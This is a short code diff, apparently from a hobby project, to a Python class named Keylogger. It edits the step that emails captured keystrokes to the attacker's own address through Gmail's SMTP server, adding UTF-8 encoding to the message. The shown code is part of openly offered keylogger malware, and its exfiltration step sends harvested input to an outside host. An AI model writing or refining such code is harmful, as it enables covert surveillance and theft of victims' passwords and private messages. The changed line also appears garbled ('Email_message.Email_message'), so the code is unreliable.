@@ -58,7 +58,7 @@ class Keylogger:
 		server = smtplib.SMTP("smtp.gmail.com", 587)
 		server.starttls()
 		server.login(email, password)
-		server.sendmail(email, email, Email_message)
+		server.sendmail(email, email, Email_message.Email_message.encode("utf8")) #Added utf8 encoding so we avoid problems when using letters from other languages
 		server.quit()	
 
 	def start(self):
